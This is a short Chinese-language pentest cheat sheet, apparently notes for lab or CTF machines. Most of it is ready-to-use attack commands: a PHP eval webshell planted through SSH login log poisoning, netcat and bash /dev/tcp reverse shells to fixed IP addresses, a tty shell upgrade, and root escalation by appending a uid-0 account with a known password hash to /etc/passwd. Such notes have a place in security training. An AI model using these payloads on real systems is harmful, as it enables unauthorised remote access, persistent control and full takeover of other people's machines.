### 收集信息

###### enum4linux

```
用于枚举Windows和Samba主机中的数据。
```











### GET-shell



#### ssh日志get-shell

```
直接尝试登陆
ssh '<?php @eval($_REQUEST['cmd']);?>'@ip

这里输错几次密码 同时，这段一句话木马也会留在/var/log/auth.log里，如果没有被转译的话

然后用蚁剑连接
```



#### 反弹shell

###### netcat反弹

```
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.36.101.179 443 >/tmp/f");?>

```

###### bash反弹

```
bash -i >& /dev/tcp/192.168.1.106/8888 0>1&
bash -i >& /dev/tcp/192.168.1.106/8888 0>1& | bash
```



### 提权

#### linux

基本上先看`sudo -l`

看看有哪些权限

###### 升级tty shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

###### capabilities提权

```
CAP_DAC_READ_SEARCH 忽略文件读及目录搜索的 DAC 访问限制

使用getcap查看权限，如：tar拥有权限，可以打包后，再解压文件，实现越权读取
```

###### /etc/passwd提权

构造一个用户 uid设置为0

```
#利用openssl生成加密的密码, 语法：openssl passwd-1-salt[salt value]password
openssl passwd -1 -salt user3 pass123
 
#mkpasswd类似于openssl passwd，它将生成指定密码字符串的哈希值。
mkpasswd -m SHA-512 pass
 
#利用python中的crypt库生成
python -c 'import crypt; print crypt.crypt("pass", "$6$salt")'
 
#利用Perl和crypt来使用salt值为我们的密码生成哈希值
perl -le 'print crypt("test","addedsalt")'
 
#php语言
php -r "print(crypt('aarti','123') . " ");"


echo "test:adMpHktIn0tR2:0:0:User_like_root:/root:/bin/bash" >>/etc/passwd


```



#### windows

### 后门
